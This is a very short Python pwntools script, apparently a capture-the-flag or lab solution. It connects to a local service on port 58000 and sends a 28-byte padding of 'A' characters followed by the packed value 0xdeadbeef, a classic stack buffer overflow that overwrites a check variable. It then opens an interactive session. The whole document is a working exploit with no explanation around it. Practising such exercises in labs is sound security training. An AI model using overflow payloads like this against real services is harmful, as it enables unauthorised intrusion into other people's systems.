from pwn import *

#r = process('./pass')
r = remote('localhost', 58000)

payload = 'A'*28

r.sendline(payload + p64(0xdeadbeef))

r.interactive()
